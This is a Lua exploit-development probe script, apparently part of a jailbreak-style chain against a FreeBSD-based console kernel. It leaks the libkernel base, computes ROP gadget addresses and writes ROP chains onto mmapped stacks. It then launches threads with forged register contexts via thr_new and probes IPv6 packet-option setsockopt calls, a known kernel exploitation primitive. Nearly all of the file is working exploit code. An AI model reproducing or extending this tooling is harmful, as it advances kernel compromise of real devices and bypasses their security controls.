-- CRASH_CLASS: MODERATE
-- PROBE 91j: Child mmap to verify R10 offset + socket restriction
--
-- 91i: child setsockopt returns -1 even as first syscall.
-- Main setsockopt with same args returns 0.
-- Question: is R10 (0x090) wrong, or are sockets blocked from children?
-- Test: child calls mmap (uses R10=flags), then socket, then setsockopt.

print("=== PROBE 91j: CHILD MMAP + SOCKET TEST ===")
print("")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end
local function q(v)
    if v==nil then return"nil"end
    if type(v)=="table" and v.h then
        local h,l=v.h,v.l
        if h<0 then h=h+0x100000000 end
        if l<0 then l=l+0x100000000 end
        return string.format("0x%08X_%08X",h,l)
    end
    return string.format("0x%X",N(v))
end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO SA") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local tc=mk(430); local tk=mk(433); local mm=mk(477)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local PRDX=uint64(string.format("0x%X%08X",ehi,elo+0x3B02D7))
local WMOV=uint64(string.format("0x%X%08X",ehi,elo+0x92C67))

local _DI=0x048;local _SI=0x050;local _DX=0x058
local _R8=0x068;local _R10=0x090;local _AX=0x078
local _CS=0x0C0;local _FL=0x0D0;local _IP=0x0E0
local _SP=0x0F8;local _SS=0x100;local _MG=0x108;local _TP=0x110

local function alive(tid)
    if not tid or N(tid)==0 then return false end
    local ok,rv=pcall(function() return tk(tid,uint64(0)) end)
    return ok and N(rv)==0
end

-- Shared buffer
local shared=memory.alloc(128); z(shared,128)
for i=0,7 do wq(shared+i*8,uint64(0xBADBADBAD)) end

local STSZ=0x4000
local ok_s,stk=pcall(function()
    return mm(uint64(0),uint64(STSZ),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_s then print("FAIL mmap stk") return end

-- ============================================================
-- TEST A: child calls mmap (uses R10 for flags, R8 for fd)
-- mmap(0, 0x4000, PROT_RW=3, MAP_ANON|MAP_PRIVATE=0x1002, -1, 0)
-- sys 477: RDI=0, RSI=0x4000, RDX=3, R10=0x1002, R8=0xFFFFFFFF, R9=0
-- ============================================================
print("--- A: CHILD MMAP ---")

local off=0
-- After mmap syscall: write result (mapped addr or -1) to shared+0
wq(stk+off,PRDI); off=off+8
wq(stk+off,uint64(N(shared))); off=off+8
wq(stk+off,WMOV); off=off+8

-- Then getpid to shared+8
wq(stk+off,PRAX); off=off+8
wq(stk+off,uint64(20)); off=off+8
wq(stk+off,SA); off=off+8
wq(stk+off,PRDI); off=off+8
wq(stk+off,uint64(N(shared)+8)); off=off+8
wq(stk+off,WMOV); off=off+8

-- Then socket(AF_INET6=28, DGRAM=2, 0) to shared+16
wq(stk+off,PRDI); off=off+8
wq(stk+off,uint64(28)); off=off+8
wq(stk+off,PRSI); off=off+8
wq(stk+off,uint64(2)); off=off+8
wq(stk+off,PRDX); off=off+8
wq(stk+off,uint64(0)); off=off+8
wq(stk+off,PRAX); off=off+8
wq(stk+off,uint64(97)); off=off+8
wq(stk+off,SA); off=off+8  -- socket()
wq(stk+off,PRDI); off=off+8
wq(stk+off,uint64(N(shared)+16)); off=off+8
wq(stk+off,WMOV); off=off+8  -- shared+16 = socket fd

-- Then setsockopt on MAIN's socket (s6=23)
local s6=N(native.fcall_with_rax(stub,97,28,2,0))
print("s6="..s6)
if s6<=0 then print("IPv6 BLOCKED") return end
local pi_c=memory.alloc(20); z(pi_c,20); wd(pi_c,2)
local p0=memory.alloc(20); z(p0,20); wd(p0,77)
native.fcall_with_rax(stub,105,s6,41,46,N(p0),20)

wq(stk+off,PRDI); off=off+8
wq(stk+off,uint64(s6)); off=off+8
wq(stk+off,PRSI); off=off+8
wq(stk+off,uint64(41)); off=off+8
wq(stk+off,PRDX); off=off+8
wq(stk+off,uint64(46)); off=off+8
-- R10 is CLOBBERED by now (mmap/socket/getpid changed it)
-- Need to provide optval somehow. R10 is from initial context,
-- but multiple syscalls may have changed it.
-- Actually: R10 is PRESERVED by the kernel across syscalls!
-- But: after mmap, R10 was 0x1002 (initial), after socket R10
-- is still preserved. So R10=0x1002 (mmap flags), NOT pi_c!
-- THIS IS THE PROBLEM: R10 keeps its value from the FIRST syscall
-- set. After mmap, R10 is still 0x1002 for setsockopt.
-- Fix: we can't set R10 without pop r10 gadget.

-- Skip setsockopt test here since R10 is wrong.
-- Instead, just nanosleep.
off=off-6*8  -- undo setsockopt setup

-- Nanosleep
local ts=memory.alloc(16); wq(ts,uint64(999)); wq(ts+8,uint64(0))
wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(N(ts))); off=off+8
wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(0)); off=off+8
wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(240)); off=off+8
wq(stk+off,SA); off=off+8

-- Context for mmap: R10=0x1002, R8=0xFFFFFFFF
local ctx=memory.alloc(0x200); z(ctx,0x200)
wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
wq(ctx+_TP,uint64(0x10000))
wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
wq(ctx+_IP,SA)
wq(ctx+_SP,uint64(N(stk)))
wq(ctx+_AX,uint64(477))           -- mmap
wq(ctx+_DI,uint64(0))             -- addr=0
wq(ctx+_SI,uint64(0x4000))        -- len=16KB
wq(ctx+_DX,uint64(3))             -- PROT_READ|PROT_WRITE
wq(ctx+_R10,uint64(0x1002))       -- MAP_ANON|MAP_PRIVATE
wq(ctx+_R8,uint64(0xFFFFFFFF))    -- fd=-1

local tb=memory.alloc(8); wq(tb,uint64(0))
local ok_t,rv_t=pcall(function() return tc(uint64(ctx),uint64(tb),uint64(0)) end)
local tid=rq(tb)
print("thr_create rv="..(ok_t and tostring(N(rv_t)) or "X").." tid="..q(tid))

local sl=memory.alloc(16); wq(sl,uint64(0)); wq(sl+8,uint64(50000000))
native.fcall_with_rax(stub,240,N(sl),0)
print("child alive="..tostring(alive(tid)))

local mmap_rv=rq(shared)
local getpid_rv=rq(shared+8)
local socket_rv=rq(shared+16)
print("mmap rv="..q(mmap_rv))
print("getpid rv="..q(getpid_rv).." (expect "..pid..")")
print("socket rv="..q(socket_rv).." (expect fd or -1)")

-- Interpret mmap result
if mmap_rv and type(mmap_rv)=="table" then
    local h=mmap_rv.h or 0
    if h<0 then h=h+0x100000000 end
    if h~=0xFFFFFFFF then
        print("*** MMAP SUCCESS — R10 offset 0x090 IS R10 ***")
    else
        print("mmap returned -1 — R10 might be wrong offset")
    end
end

-- Interpret socket result
if socket_rv and type(socket_rv)=="table" then
    local h=socket_rv.h or 0
    if h<0 then h=h+0x100000000 end
    if h==0xFFFFFFFF then
        print("socket returned -1 — child CANNOT create sockets?")
    else
        local sv=N(socket_rv)
        if sv>0 and sv<10000 then
            print("*** CHILD SOCKET fd="..sv.." — socket works from child ***")
        end
    end
end

if tid and N(tid)>0 then pcall(function() tk(tid,uint64(9)) end) end

-- ============================================================
-- TEST B: child calls setsockopt as FIRST syscall,
-- with R10=optval at DIFFERENT context offsets
-- ============================================================
print("")
print("--- B: R10 OFFSET SCAN ---")

-- Reset marker
z(p0,20); wd(p0,77)
native.fcall_with_rax(stub,105,s6,41,46,N(p0),20)

local test_offsets={0x060,0x068,0x070,0x080,0x088,0x090,0x098,0x0A0,0x0A8,0x0B0,0x0B8}

for idx,r10_off in ipairs(test_offsets) do
    local ok_sm,stkm=pcall(function()
        return mm(uint64(0),uint64(0x4000),uint64(3),
            uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
    end)
    if not ok_sm then print("  mmap fail "..idx) break end

    local shm=memory.alloc(16); z(shm,16)
    wq(shm,uint64(0xBAD))

    -- Chain: write setsockopt rv to shm, then nanosleep
    local offm=0
    wq(stkm+offm,PRDI); offm=offm+8
    wq(stkm+offm,uint64(N(shm))); offm=offm+8
    wq(stkm+offm,WMOV); offm=offm+8
    wq(stkm+offm,PRDI); offm=offm+8; wq(stkm+offm,uint64(N(ts))); offm=offm+8
    wq(stkm+offm,PRSI); offm=offm+8; wq(stkm+offm,uint64(0)); offm=offm+8
    wq(stkm+offm,PRAX); offm=offm+8; wq(stkm+offm,uint64(240)); offm=offm+8
    wq(stkm+offm,SA); offm=offm+8

    -- Context: setsockopt as first syscall, pi_c at r10_off
    local ctxm=memory.alloc(0x200); z(ctxm,0x200)
    wq(ctxm+_MG,uint64(0x480)); wd(ctxm+_FL,0)
    wq(ctxm+_TP,uint64(0x10000))
    wq(ctxm+_CS,uint64(0x43)); wq(ctxm+_SS,uint64(0x3B))
    wq(ctxm+_IP,SA)
    wq(ctxm+_SP,uint64(N(stkm)))
    wq(ctxm+_AX,uint64(105))
    wq(ctxm+_DI,uint64(s6))
    wq(ctxm+_SI,uint64(41))
    wq(ctxm+_DX,uint64(46))
    -- R8 at _R8 (0x068) = 20 always
    wq(ctxm+0x068,uint64(20))
    -- Write pi_c at test offset
    wq(ctxm+r10_off,uint64(N(pi_c)))

    local tbm=memory.alloc(8); wq(tbm,uint64(0))
    pcall(function() tc(uint64(ctxm),uint64(tbm),uint64(0)) end)
    local tidm=rq(tbm)

    native.fcall_with_rax(stub,240,N(sl),0)

    local rv=rq(shm)
    local is_success=false
    if rv and type(rv)=="table" then
        local h=rv.h or 0; if h<0 then h=h+0x100000000 end
        is_success=(h~=0xFFFFFFFF and N(rv)<100)
    elseif rv then
        is_success=(N(rv)==0)
    end

    local mk_val=nil
    if is_success then
        local gb=memory.alloc(32); z(gb,32)
        local gl=memory.alloc(4); wd(gl,20)
        native.fcall_with_rax(stub,118,s6,41,46,N(gb),N(gl))
        mk_val=rd(gb)
    end

    print("  off="..string.format("0x%03X",r10_off)
        .." rv="..q(rv)
        ..(is_success and " *** rv=0 ***" or "")
        ..(mk_val and " mk="..mk_val or ""))

    if tidm and N(tidm)>0 then pcall(function() tk(tidm,uint64(9)) end) end

    -- Reset marker for next test
    if is_success then
        z(p0,20); wd(p0,77)
        native.fcall_with_rax(stub,105,s6,41,46,N(p0),20)
    end
end

-- ============================================================
-- Cleanup
-- ============================================================
print("")
native.fcall_with_rax(stub,6,s6)
print("canary="..N(native.fcall_with_rax(stub,20)))
print("=== 91j DONE ===")
